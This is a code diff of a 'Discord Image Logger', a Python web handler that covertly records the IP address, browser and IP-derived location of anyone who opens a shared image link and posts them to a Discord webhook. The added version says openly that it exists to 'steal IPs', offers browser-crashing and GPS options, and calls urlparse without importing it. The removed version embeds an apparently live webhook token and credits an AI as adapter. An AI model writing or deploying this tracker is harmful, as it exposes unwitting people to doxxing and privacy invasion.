@@ -1,178 +1,149 @@
-"""
-Vercel Serverless Discord Image Logger - Adapted from Screenshots
-Handles GET requests to log IPs via Discord webhook, then redirects to image.
-Deploy as root / with rewrites—Educational/Testing Only!
-"""
-
-import base64
-import json
-import os  # For Vercel env IP fallback
 from http.server import BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
+from urllib import parse
+import traceback, requests, base64, httpagentparser
 
-import requests
-import traceback
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
 
-# App metadata
-app = "Discord Image Logger"
-version = "v2.0-vc"
-author = "Dekrypt (Adapted by CodeMaster AI)"
-
-# Config—tweak here!
 config = {
-    "webhook": "https://discord.com/api/webhooks/1439639460382773248/7fVQ1_3b2IEabj9rgMYYFfF0Byqu_su4XhdwLlfjEgxbcoU0Ex8Kv6fAsqStgBAqUYlC",
-    "default_image_url": "https://www.windowslatest.com/wp-content/uploads/2024/10/Windows-XP-Bliss-Wallpaper-4K-scaled.jpg",  # Your Bliss wallpaper!
-    "custom_image": True,  # Use ?url= param for overrides
-    "username": "Image Logger",
-    "color": "0xFF0000",  # Red embed
+    # BASE CONFIG
+    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+    "image": "https://yoursite.com/imagelogger?url=(url-escaped link to an image here)", # You can have a custom image by using a URL argument
+    "custom_image": True, # Allows you to use a URL argument to change the image (SEE README)
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": "0xFF0000", # Hex Color you want for the embed (Example: Red is 0xFF0000)
     "options": {
-        "location": False,  # Geolocation (off for ethics/privacy)
-        "explanation": True,  # Add pwned note
-        "link_alerts": True,
+        "crash": False, # Tries to crash/freeze the user's browser, may not work (SEE https://github.com/Dekrypt/Chromebook-Crasher)
+        "location": False, # Uses GPS to find users exact location (Real Address, etc.) because it asks the user which may be suspicious
+        "message": "", # Show a custom message when user opens the image
+        "dismiss": False, # Enable when user opens the image
+        "explanation": True, # Embed pwned text (Dekrypt's Image Logger)
     },
+    "redirect": False, # Redirect to a web
+    "image_redirect": "http://your-url-here.com/in-the-message-to-break", # If redirect
+    "buggedImage": False, # Bugged image (disables image and crashes browser)
+    "antispam": "", # Antispam (No antispam)
+    "linkAlerts": True, # Link alerts
 }
 
-blacklisted_ips = ["34.", "35."]  # Skip Googlebot, etc.
+blacklistedIPs = ("34.", "35.") # This feature is undocumented mainly due to it being for detecting bots better.
 
-# Tiny fallback PNG (1x1 red)
-DEFAULT_IMAGE_B64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
 
-def botcheck(ip: str, useragent: str) -> bool:
-    """Check if request is from a bot or blacklisted IP."""
-    if any(ip.startswith(prefix) for prefix in blacklisted_ips):
-        return True
-    if useragent.startswith("TelegramBot"):
-        return True
-    return False
+def reportError(error):
+    requests.post(config["webhook"], json = {
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [ {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        } ],
+    })
 
-def report_error(error: str):
-    """Log errors to Discord."""
-    try:
-        requests.post(config['webhook'], json={
-            "username": config['username'],
-            "content": "@everyone",
-            "embeds": [{
-                "title": "Image Logger Error",
-                "color": int(config['color'], 16),
-                "description": f"Vercel invocation failed: {error}",
-            }]
-        }, timeout=5)
-    except Exception as e:
-        print(f"Error reporting failed: {e}")  # Fallback to Vercel logs
-
-def make_report(ip: str, useragent: str, coords: str = None, endpoint: str = "/"):
-    """Send IP log embed to Discord."""
-    if botcheck(ip, useragent):
-        return  # Skip bots
-
-    # Optional link alert
-    if config['options']['link_alerts']:
-        requests.post(config['webhook'], json={
-            "username": config['username'],
-            "embeds": [{
-                "title": "Logger Link Shared",
-                "color": int(config['color'], 16),
-                "description": f"Potential IP incoming from {endpoint}!",
-            }]
-        }, timeout=5)
-
-    # Main embed
-    fields = [
-        {"name": "IP", "value": ip, "inline": True},
-        {"name": "User Agent", "value": useragent[:100] + "..." if len(useragent) > 100 else useragent, "inline": False},
-    ]
-    if coords:
-        fields.append({"name": "Coords", "value": coords, "inline": True})
-
+def makeReport(ip, useragent = None, coords = None, endpoint = "/", url = False):
+    if ip.startswith(blacklistedIPs): # Blacklisted IP
+        return
+    bot = botCheck(ip, useragent)
+    if bot:
+        return
+    if config["linkAlerts"]:
+        requests.post(config["webhook"], json = {
+            "username": config["username"],
+            "content": "",
+            "embeds": [ {
+                "title": "Image Logger - Link Sent",
+                "color": config["color"],
+                "description": f"An *Image Logging* link was sent in a chat! You may receive an IP soon. URL: **{endpoint}** IP: **{ip}**",
+            } ]
+        })
+    geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,asn,lat,lon,mobile,proxy,hosting,timezone")
+    geo = geo.json()
+    if geo["status"] == "success":
+        country = geo["country"] if geo["country"] else "Unknown"
+        region = geo["regionName"] if geo["regionName"] else "Unknown"
+        city = geo["city"] if geo["city"] else "Unknown"
+        coords = f"{geo['lat']}, {geo['lon']}" if coords else f"[Google Maps](https://www.google.com/maps/search/google+maps+{geo['lat']},{geo['lon']} (Approximate if no coords))"
+        timezone = geo["timezone"].split("/")[0] if geo["timezone"] else "Unknown"
+        mobile = geo["mobile"]
+        vpn = geo["proxy"] if geo["proxy"] and not geo["hosting"] else "Possibly" if geo["hosting"] else "False"
+        hosting = geo["hosting"] if geo["hosting"] and not geo["proxy"] else "Possibly" if geo["proxy"] else "False"
+        os_ = geo["org"] if geo["org"] else "Unknown"
+        browser = httpagentparser.detect(useragent)
+    else:
+        country = region = city = coords = timezone = mobile = vpn = hosting = os_ = browser = "Unknown"
     embed = {
-        "title": "🖼️ IP Logged!",
-        "description": f"Endpoint: {endpoint}",
-        "color": int(config['color'], 16),
-        "fields": fields,
+        "title": "Image Logger - IP Logged",
+        "color": int(config["color"], 16),
+        "description": f"**A User opened the Original Image**\n**Endpoint:** {endpoint}",
+        "fields": [
+            {"name": "IP", "value": ip, "inline": True},
+            {"name": "Provider", "value": geo["isp"] if geo["isp"] else "Unknown", "inline": True},
+            {"name": "ASN", "value": geo["asn"] if geo["asn"] else "Unknown", "inline": True},
+            {"name": "Country", "value": country, "inline": True},
+            {"name": "Region", "value": region, "inline": True},
+            {"name": "City", "value": city, "inline": True},
+            {"name": "Coords", "value": coords, "inline": True},
+            {"name": "Timezone", "value": timezone, "inline": True},
+            {"name": "Mobile", "value": mobile, "inline": True},
+            {"name": "VPN", "value": vpn, "inline": True},
+            {"name": "Hosting", "value": hosting, "inline": True},
+            {"name": "OS", "value": os_, "inline": True},
+            {"name": "Browser", "value": browser, "inline": True},
+            {"name": "User Agent", "value": (useragent[:100] + "...") if len(useragent) > 100 else useragent, "inline": False},
+        ]
     }
-    if config['options']['explanation']:
-        embed["description"] += "\n**Explanation:** Educational demo—pwned by image logger! (Get consent IRL)"
-
-    try:
-        requests.post(config['webhook'], json={
-            "username": config['username'],
-            "content": "@everyone" if config['options']['link_alerts'] else "",
-            "embeds": [embed]
-        }, timeout=5)
-        print(f"Log sent for IP: {ip}")  # Vercel console feedback
-    except Exception as e:
-        report_error(str(e))
+    if config["options"]["explanation"]:
+        embed["description"] += "\n**Explanation:** You've been pwned by Dekrypt's Image Logger!"
+    requests.post(config["webhook"], json = {
+        "username": config["username"],
+        "content": "@everyone" if config["antispam"] else "",
+        "embeds": [embed]
+    })
 
 class ImageLoggerHandler(BaseHTTPRequestHandler):
-    """
-    Vercel-compatible handler: Inherits BaseHTTPRequestHandler.
-    Vercel instantiates this per request—no need for HTTPServer.
-    """
     def do_GET(self):
         try:
             parsed = urlparse(self.path)
             params = parse_qs(parsed.query)
-
-            # Better IP detection for Vercel (from headers/env)
-            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip() or \
-                 os.environ.get('VERCEL_CLIENT_IP', 'unknown') or \
-                 (self.client_address[0] if hasattr(self, 'client_address') else 'unknown')
-            ua = self.headers.get('User-Agent', 'Unknown')
-            endpoint = parsed.path or "/"
-
-            print(f"Request from IP: {ip}, UA: {ua}, Path: {endpoint}")  # Debug log
-
-            # Bot check
-            if botcheck(ip, ua):
-                self._serve_response(params)
+            ip = self.headers.get('x-forwarded-for', self.client_address[0])
+            useragent = self.headers.get('user-agent', 'Unknown')
+            endpoint = parsed.path
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
-
-            # Optional geolocation (lightweight, non-blocking)
-            coords = None
-            if config['options']['location']:
-                try:
-                    geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=lat,lon", timeout=3)
-                    geo_data = geo_resp.json()
-                    if geo_data.get('status') == 'success':
-                        coords = f"{geo_data['lat']}, {geo_data['lon']}"
-                except:
-                    pass
-
-            # Log to Discord
-            make_report(ip, ua, coords, endpoint)
-
-            # Serve redirect
-            self._serve_response(params)
-
-        except Exception as e:
-            error_msg = f"Handler error: {str(e)}\n{traceback.format_exc()}"
-            print(error_msg)  # Vercel logs
-            report_error(error_msg)
-            self.send_response(500)
-            self.send_header('Content-Type', 'text/plain')
+            if botCheck(ip, useragent):
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else params.get('url', [config["image"]])[0])
+                self.end_headers()
+                if config["buggedImage"]:
+                    self.wfile.write(binaries["loading"])
+                return
+            makeReport(ip, useragent, endpoint=endpoint)
+            url = params.get('url', [config["image"]])[0]
+            if config["redirect"]:
+                self.send_response(302)
+                self.send_header('Location', config["image_redirect"])
+            else:
+                self.send_response(302)
+                self.send_header('Location', url)
             self.end_headers()
-            self.wfile.write(b'Internal error—check logs!')
+        except Exception as e:
+            reportError(str(e))
+            self.send_response(500)
+            self.end_headers()
 
-    def _serve_response(self, params):
-        """Redirect to custom/default image."""
-        if not config['custom_image']:
-            self._serve_fallback()
-            return
+binaries = {
+    "loading": base64.b64decode(b'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==')
+}
 
-        custom_img = params.get('url', [None])[0]
-        target_url = custom_img or config['default_image_url']
-
-        self.send_response(302)
-        self.send_header('Location', target_url)
-        self.end_headers()
-        print(f"Redirecting to: {target_url}")  # Debug
-
-    def _serve_fallback(self):
-        """Tiny PNG if no redirect."""
-        self.send_response(200)
-        self.send_header('Content-Type', 'image/png')
-        self.send_header('Content-Length', len(DEFAULT_IMAGE_B64))
-        self.end_headers()
-        self.wfile.write(base64.b64decode(DEFAULT_IMAGE_B64))
-
-# Vercel auto-calls do_GET on the handler—no main needed!
+if __name__ == "__main__":
+    from http.server import HTTPServer
+    HTTPServer(("0.0.0.0", 80), ImageLoggerHandler).serve_forever()
